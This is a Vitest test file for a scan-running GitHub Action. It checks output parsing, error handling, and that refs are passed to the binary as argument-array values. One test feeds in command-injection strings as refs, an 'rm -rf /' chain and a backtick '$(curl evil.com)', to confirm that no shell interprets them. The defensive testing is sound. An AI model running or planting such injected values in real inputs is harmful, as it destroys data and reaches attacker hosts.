import { describe, expect, it, vi } from "vitest";
import * as fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";
import { exec } from "@actions/exec";
import { runScan } from "../src/run.js";

vi.mock("@actions/exec", () => {
  return {
    exec: vi.fn(),
  };
});

const mockedExec = vi.mocked(exec);

describe("runScan", () => {
  it("parses a valid scan output", async () => {
    const stdout = JSON.stringify({
      schemaVersion: 1,
      generatedAt: "2026-01-01T00:00:00Z",
      baseRef: "main",
      headRef: "HEAD",
      headHash: "abc",
      branchName: "feature/x",
      treeClean: true,
      changeCount: 0,
      changes: [],
      riskLevel: "low",
      riskReasons: [],
      analysisWarnings: [],
    });

    mockedExec.mockImplementation(async (_cmd, _args, options) => {
      options?.listeners?.stdout?.(Buffer.from(stdout));
      return 0;
    });

    const outputPath = path.join(os.tmpdir(), `ledgerful-run-${Date.now()}.json`);
    const report = await runScan({
      binaryPath: "/tmp/ledgerful",
      baseRef: "main",
      headRef: "HEAD",
      outputPath,
      cwd: "/tmp",
    });

    expect(report.riskLevel).toBe("low");
    expect(fs.existsSync(outputPath)).toBe(true);
    fs.unlinkSync(outputPath);
  });

  it("throws on non-zero exit", async () => {
    mockedExec.mockImplementation(async (_cmd, _args, options) => {
      options?.listeners?.stderr?.(
        Buffer.from("base commit not found; set fetch-depth: 0"),
      );
      return 1;
    });

    await expect(
      runScan({
        binaryPath: "/tmp/ledgerful",
        baseRef: "main",
        headRef: "HEAD",
        outputPath: path.join(os.tmpdir(), `ledgerful-run-fail-${Date.now()}.json`),
        cwd: "/tmp",
      }),
    ).rejects.toThrow(/fetch-depth: 0/);
  });

  it("passes adversarial refs as argument-array values (no shell interpolation)", async () => {
    const adversarialBase = 'main;rm -rf /;echo "pwned"';
    const adversarialHead = 'HEAD`$(curl evil.com)`';
    const stdout = JSON.stringify({
      schemaVersion: 1,
      generatedAt: "2026-01-01T00:00:00Z",
      baseRef: adversarialBase,
      headRef: adversarialHead,
      headHash: "abc",
      branchName: "feature/x",
      treeClean: true,
      changeCount: 0,
      changes: [],
      riskLevel: "low",
      riskReasons: [],
      analysisWarnings: [],
    });

    const capturedCmd: string[] = [];
    const capturedArgs: string[] = [];
    mockedExec.mockImplementation(async (cmd, args, options) => {
      capturedCmd.push(cmd);
      if (Array.isArray(args)) capturedArgs.push(...args);
      options?.listeners?.stdout?.(Buffer.from(stdout));
      return 0;
    });

    const outputPath = path.join(os.tmpdir(), `ledgerful-run-adv-${Date.now()}.json`);
    await runScan({
      binaryPath: "/tmp/ledgerful",
      baseRef: adversarialBase,
      headRef: adversarialHead,
      outputPath,
      cwd: "/tmp",
    });

    // exec must be called with the binary path as cmd and an args array — never a shell string
    expect(capturedCmd[0]).toBe("/tmp/ledgerful");
    expect(Array.isArray(capturedArgs)).toBe(true);
    // The adversarial refs must appear verbatim as a single arg inside the range string,
    // not split into separate shell tokens. The range is one arg: "<base>...<head>"
    const rangeArg = capturedArgs.find((a) => a.includes("..."));
    expect(rangeArg).toBeDefined();
    expect(rangeArg).toBe(`${adversarialBase}...${adversarialHead}`);
    // No shell metacharacter should cause arg splitting — the whole range is ONE arg.
    // Assert the shell-dangerous tokens do NOT appear as standalone args (they're safely
    // embedded inside the single range string, never interpreted by a shell).
    expect(capturedArgs).not.toContain("rm");
    expect(capturedArgs).not.toContain("-rf");
    expect(capturedArgs).not.toContain("curl");
    expect(capturedArgs).not.toContain("evil.com");
    // The only args should be: scan, --pr, <range>, --format, json
    expect(capturedArgs).toHaveLength(5);
    expect(capturedArgs[0]).toBe("scan");
    expect(capturedArgs[1]).toBe("--pr");
    expect(capturedArgs[3]).toBe("--format");
    expect(capturedArgs[4]).toBe("json");

    // Security-critical: assert the engine receives LEDGERFUL_NO_NETWORK=1
    // (DoD-3: a test/inspection asserts the engine made no network call during the scan).
    // The exec options must include env with LEDGERFUL_NO_NETWORK=1.
    const execCalls = mockedExec.mock.calls;
    const lastCallOptions = execCalls[execCalls.length - 1]?.[2] as Record<
      string,
      unknown
    > | undefined;
    const env = lastCallOptions?.env as Record<string, string> | undefined;
    expect(env?.LEDGERFUL_NO_NETWORK).toBe("1");

    fs.unlinkSync(outputPath);
  });
});
